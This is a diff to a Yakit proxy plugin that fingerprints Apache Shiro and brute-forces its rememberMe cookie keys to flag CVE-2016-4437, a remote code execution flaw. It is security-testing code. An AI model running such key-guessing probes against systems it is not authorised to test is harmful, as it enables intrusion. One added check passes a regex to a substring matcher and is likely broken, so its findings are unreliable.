@@ -2,7 +2,7 @@
 
 #--------------------------WORKSPACE-----------------------------
 __test__ = func() {
-    results, err := yakit.GenerateYakitMITMHooksParams("GET", "http://cybertunnel.run:8080")
+    results, err := yakit.GenerateYakitMITMHooksParams("GET", "http://127.0.0.1:8009")
     if err != nil {
         return
     }
@@ -145,7 +145,8 @@ mirrorNewWebsite = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*
     freq = fuzz.HTTPRequest(req, fuzz.https(isHttps))[0]
     reqHeader, _ = str.SplitHTTPHeadersAndBodyFromPacket(req)
     host, port, _ = str.ParseStringToHostPort(url)
-    if !str.MatchAllOfSubString(reqHeader, "rememberMe=") {
+    shiroCookieKey = "rememberMe"
+    if !str.MatchAllOfRegexp(reqHeader, "remem?berMe=") {
         yakit_output(sprintf("准备发送 shiro 探测请求 for: %v", url))
         rsp, err = freq.FuzzCookie("rememberMe", "{{base64({{rs(10)}})}};").ExecFirst(httpool.context(ctx))
         if err != nil || rsp.Error != nil {
@@ -154,14 +155,29 @@ mirrorNewWebsite = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*
         }
 
         headers, body := str.SplitHTTPHeadersAndBodyFromPacket(rsp.ResponseRaw)
-        if !str.MatchAllOfSubString(headers, "rememberMe=deleteMe;") {
+        if !str.MatchAllOfRegexp(headers, `(?i)remem?berMe=deleteMe;`) {
             yakit_output(sprintf("%v 未检测到 shiro", str.HostPort(host, port)))
             return
         }
+
+        result = re.FindSubmatch(headers, `(?i)(remem?berMe)\s*=\s*deleteMe;?`)
+        if len(result) > 1 {
+            shiroCookieKey = result[1]
+        }
     }
-    yakit_output(sprintf("%v 检测到 shiro", str.HostPort(host, port)))
+    yakit_output(sprintf("%v 检测到 shiro, Cookie: %v", str.HostPort(host, port), shiroCookieKey))
     yakit_status("Shiro:"+str.HostPort(host, port), "Shiro 指纹")
 
+    risk.NewRisk(
+        url, 
+        risk.title(sprintf("Shiro(Cookie) Detected: %v", url)),
+        risk.titleVerbose("检测到 Shiro(Cookie) 框架使用"),
+        risk.type("info"), risk.typeVerbose("敏感框架使用"),
+        risk.severity("medium"), ## 给个中危吧？
+        risk.details({"cookie_name": shiroCookieKey}),
+    )
+
+    yakit_output("开始爆破 Shiro Weak Key")
     cookie = make([]var)
     for _, key := range keys {
         for _, encItem = range [
@@ -184,22 +200,38 @@ mirrorNewWebsite = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*
     }
 
     for _, cookieElement := range cookie {
-        result = freq.FuzzCookie("rememberMe", cookieElement["cookie"]).ExecFirst()[0]
+        result = freq.FuzzCookie(shiroCookieKey, cookieElement["cookie"]).ExecFirst()[0]
         if result == nil||result.Error != nil {
+            yakit_output("FAILED for %v=%v", shiroCookieKey, cookieElement["cookie"])
             continue
         }
         headers, _ = str.SplitHTTPHeadersAndBodyFromPacket(result.ResponseRaw)
         if headers == "" {
             continue
         }
-        if str.MatchAllOfSubString(headers, "rememberMe=deleteMe") {
+        if str.MatchAllOfSubString(headers, `(?i)remem?berMe\s*=\s*deleteMe;?`) {
             continue
         }else{
-            yakit_output({
+            detail := {
+                "shiro_cookie_key": shiroCookieKey,
+                "payload": cookieElement["cookie"],
                 "shiro_key": cookieElement["key"],
-                "url": url,
-                "name": "发现漏洞！",
-            })
+                "shiro_aes_mode": cookieElement["aes-mode"],
+                "request": codec.EncodeBase64(result.RequestRaw),
+                "response": codec.EncodeBase64(result.ResponseRaw),
+            }
+            risk.NewRisk(
+                url,
+                risk.severity("critical"),
+                risk.title(sprintf("CVE-2016-4437(Shiro RCE): %v", url)),
+                risk.titleVerbose(sprintf("CVE-2016-4437(Shiro 远程代码执行)：%v", url)),
+                risk.type("rce"),
+                risk.payload(cookieElement["cookie"]),
+                risk.details(detail),
+            )
+            delete(detail, "request")
+            delete(detail, "response")
+            yakit_output(detail)
             return
         }
     }
